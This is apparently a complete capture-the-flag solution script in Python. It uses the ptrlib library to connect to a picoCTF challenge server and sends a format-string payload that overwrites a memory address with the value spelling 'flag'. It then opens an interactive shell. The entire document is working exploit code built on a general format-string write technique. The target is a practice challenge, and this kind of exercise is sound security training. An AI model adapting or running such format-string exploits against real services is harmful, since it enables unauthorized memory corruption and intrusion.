from ptrlib import *

# sock = Process("./vuln")
sock = Socket("nc rhea.picoctf.net 51885")

payload = fsb(14, {0x404060: 0x67616C66}, bits=64)
sock.sendlineafter("say?\n", payload)

sock.sh()